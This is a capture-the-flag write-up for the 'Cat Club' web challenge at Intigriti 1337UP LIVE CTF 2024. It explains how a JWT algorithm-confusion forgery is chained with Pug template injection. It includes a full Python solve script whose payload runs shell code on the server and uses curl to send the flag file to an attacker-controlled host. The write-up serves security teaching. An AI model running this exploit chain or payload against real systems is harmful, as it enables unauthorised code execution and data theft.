---
name: Cat Club (2024)
event: Intigriti 1337UP LIVE CTF 2024
category: Web
description: Writeup for Cat Club (Web) - 1337UP LIVE CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Cat Club

## Video walkthrough

[![VIDEO](https://img.youtube.com/vi/Vh9SqT9KyL8/0.jpg)](https://youtu.be/Vh9SqT9KyL8 "JWT Algorithm Confusion and SSTI (Pug)")

## Challenge Description

> People are always complaining that there's not enough cat pictures on the internet.. Something must be done!!

## Solution

Players open the website to some random cute cats.

![](./images/0.PNG)

j/k they are _my_ cute cats 🥰

We can create an account and login, to view more pics.

![](./images/1.PNG)

Not much interesting to note, except perhaps that our username is reflected back to use. Let's check the downloadable source code.

We'll see a `sanitizer.js`, which sounds interesting. It prevents us from entering non-alphanumeric characters in the username.

{% code overflow="wrap" %}

```python
function sanitizeUsername(username) {
    const usernameRegex = /^[a-zA-Z0-9]+$/;

    if (!usernameRegex.test(username)) {
        throw new BadRequest("Username can only contain letters and numbers.");
    }

    return username;
}
```

{% endcode %}

Let's check the code where the username is reflected on the page.

{% code overflow="wrap" %}

```js
router.get("/cats", getCurrentUser, (req, res) => {
    if (!req.user) {
        return res.redirect("/login?error=Please log in to view the cat gallery");
    }

    const templatePath = path.join(__dirname, "views", "cats.pug");

    fs.readFile(templatePath, "utf8", (err, template) => {
        if (err) {
            return res.render("cats");
        }

        if (typeof req.user != "undefined") {
            template = template.replace(/guest/g, req.user);
        }

        const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });

        res.send(html);
    });
});
```

{% endcode %}

Looks like an [SSTI](https://portswigger.net/web-security/server-side-template-injection), if we could only enter those dangerous characters 🤔 We should check the `getCurrentUser` middleware.

{% code overflow="wrap" %}

```js
function getCurrentUser(req, res, next) {
    const token = req.cookies.token;

    if (token) {
        verifyJWT(token)
            .then((payload) => {
                req.user = payload.username;
                res.locals.user = req.user;
                next();
            })
            .catch(() => {
                req.user = null;
                res.locals.user = null;
                next();
            });
    } else {
        req.user = null;
        res.locals.user = null;
        next();
    }
}
```

{% endcode %}

So, our username is read from the JWT? Maybe we can [tamper with it..](https://portswigger.net/web-security/jwt)

{% code overflow="wrap" %}

```js
const privateKey = fs.readFileSync(path.join(__dirname, "..", "private_key.pem"), "utf8");
const publicKey = fs.readFileSync(path.join(__dirname, "..", "public_key.pem"), "utf8");

function signJWT(payload) {
    return new Promise((resolve, reject) => {
        jwt.encode(privateKey, payload, "RS256", (err, token) => {
            if (err) {
                return reject(new Error("Error encoding token"));
            }
            resolve(token);
        });
    });
}

function verifyJWT(token) {
    return new Promise((resolve, reject) => {
        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
            return reject(new Error("Invalid token format"));
        }

        jwt.decode(publicKey, token, (err, payload, header) => {
            if (err) {
                return reject(new Error("Invalid or expired token"));
            }

            if (header.alg.toLowerCase() === "none") {
                return reject(new Error("Algorithm 'none' is not allowed"));
            }

            resolve(payload);
        });
    });
}
```

{% endcode %}

The `none` algorithm is blocked, so we can't remove the signature verification but how about [algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)? If we can change the token from `RS256` (asymmetric) to `HS256` (symmetric) and then sign with the public key, the server will use the same key to verify the signature 🧠

You can do this with the JWT tool, or one of the JWT extension in burp. I made a [video series](https://www.youtube.com/watch?v=GIq3naOLrTg&list=PLmqenIp2RQciV955S2rqGAn2UOrR2NX-v) covering the JWT attack material and labs from Portswigger, over on the Intigriti channel if you are interested 🙂

The public key is exposed on the common `/jwks.json` endpoint.

{% code overflow="wrap" %}

```js
router.get("/jwks.json", async (req, res) => {
    try {
        const publicKey = await fsPromises.readFile(path.join(__dirname, "..", "public_key.pem"), "utf8");
        const publicKeyObj = crypto.createPublicKey(publicKey);
        const publicKeyDetails = publicKeyObj.export({ format: "jwk" });

        const jwk = {
            kty: "RSA",
            n: base64urlEncode(Buffer.from(publicKeyDetails.n, "base64")),
            e: base64urlEncode(Buffer.from(publicKeyDetails.e, "base64")),
            alg: "RS256",
            use: "sig",
        };

        res.json({ keys: [jwk] });
    } catch (err) {
        res.status(500).json({ message: "Error generating JWK" });
    }
});
```

{% endcode %}

All that's left is to modify our username with a Pug SSTI payload, e.g. from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

I automated the whole process with detailed comments explaining each step. You just need to update the `BASE_URL`, `JWT_TOOL_PATH` and the `ATTACKER_SERVER` in the `SSTI_PAYLOAD`.

### solve.py

{% code overflow="wrap" %}

```python
import requests
import subprocess
from base64 import urlsafe_b64decode
from Crypto.PublicKey import RSA

# Constants for challenge
BASE_URL = 'https://catclub-0.ctf.intigriti.io'
REGISTER_URL = f'{BASE_URL}/register'
LOGIN_URL = f'{BASE_URL}/login'
JWK_URL = f'{BASE_URL}/jwks.json'
CAT_URL = f'{BASE_URL}/cats'
JWT_TOOL_PATH = f'/home/crystal/apps/jwt_tool'

SSTI_PAYLOAD = "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('curl https://ATTACKER_SERVER/?flag=$(cat /flag* | base64)')}()}"

def base64url_decode(data):
    return urlsafe_b64decode(data + b'=' * (-len(data) % 4))

# Register a new user
def register_user(username, password):
    print(f"[*] Attempting to register user: {username}")
    response = requests.post(
        REGISTER_URL, data={"username": username, "password": password})

    if response.status_code == 200:
        print(f"[*] Registered user: {username}")
    else:
        print(f"[!] Failed to register user: {response.text}")
    return response.status_code == 200

# Login to get JWT
def login_user(username, password):
    session = requests.Session()
    print(f"[*] Attempting to login user: {username}")
    response = session.post(
        LOGIN_URL, data={"username": username, "password": password})

    if response.status_code == 303:
        response = session.get(BASE_URL)

    token = session.cookies.get("token")
    if token:
        print(f"[*] Retrieved JWT: {token}")
    else:
        print(f"[!] Failed to retrieve JWT")
    return token

# Download the JWK (public key)
def download_jwk():
    print(f"[*] Attempting to download JWK...")
    response = requests.get(JWK_URL)

    if response.status_code == 200:
        print("[*] JWK download successful")
        print(f"[*] JWK Response: {response.json()}")
        return response.json()['keys'][0]
    else:
        print(f"[!] Failed to download JWK: {response.text}")
        return None

# Recreate the RSA public key from JWK components (n and e) and save it to a file
def rsa_public_key_from_jwk(jwk):
    print(f"[*] Recreating RSA Public Key from JWK...")

    n = base64url_decode(jwk['n'].encode('utf-8'))
    e = base64url_decode(jwk['e'].encode('utf-8'))

    n_int = int.from_bytes(n, 'big')
    e_int = int.from_bytes(e, 'big')

    rsa_key = RSA.construct((n_int, e_int))
    public_key_pem = rsa_key.export_key('PEM')

    # Save the public key to a file with a newline at the end
    with open("recovered_public.key", "wb") as f:
        f.write(public_key_pem)
        if not public_key_pem.endswith(b'\n'):
            f.write(b"\n")

    print(
        f"[*] Recreated RSA Public Key saved to 'recovered_public.key':\n{public_key_pem.decode()}")
    return

# Tamper JWT with jwt_tool
def modify_jwt_with_tool(token):
    print(f"[*] Modifying JWT with jwt_tool...")

    command = [
    "python", f"{JWT_TOOL_PATH}/jwt_tool.py", token, "-X", "k", "-pk", "./recovered_public.key", "-I", "-pc", "username", "-pv", SSTI_PAYLOAD
    ]

    # Run jwt_tool and capture the output
    result = subprocess.run(command, capture_output=True, text=True)

    # Extract the modified token from jwt_tool output
    for line in result.stdout.splitlines():
        if line.startswith("[+] "):
            modified_token = line.split(" ")[1].strip()
            print(f"[*] Modified JWT: {modified_token}")
            return modified_token

    print(f"[!] Modified JWT not found in jwt_tool output")
    return None

# Test SSTI injection
def test_ssti(modified_token):
    cookies = {'token': modified_token}
    print(f"[*] Sending modified JWT in cookies to test SSTI injection...")
    response = requests.get(CAT_URL, cookies=cookies)

    if response.status_code == 200:
        print("[*] SSTI payload executed successfully!")
        print(f"[*] Server response:\n{response.text}")
    else:
        print(
            f"[!] SSTI execution failed: {response.status_code} - {response.text}")

def main():
    username = "cat"
    password = "cat"

    # Step 1: Register user
    if not register_user(username, password):
        print("[!] Failed to register user.")
        return

    # Step 2: Login and retrieve JWT
    jwt_token = login_user(username, password)
    if not jwt_token:
        print("[!] Failed to retrieve JWT.")
        return

    # Step 3: Download JWK (public key)
    jwk = download_jwk()
    if not jwk:
        print("[!] Failed to download JWK.")
        return

    # Step 4: Recreate public key PEM from JWK
    rsa_public_key_from_jwk(jwk)

    # Step 5: Modify JWT claim (inject payload) using jwt_tool
    modified_jwt = modify_jwt_with_tool(jwt_token)
    if not modified_jwt:
        print("[!] Failed to modify JWT using jwt_tool.")
        return

    # Step 6: Test SSTI injection by sending the modified JWT
    test_ssti(modified_jwt)

if __name__ == "__main__":
    main()
```

{% endcode %}

The attacker server will receive a request containing the base64-encoded flag.

Flag: `INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}`
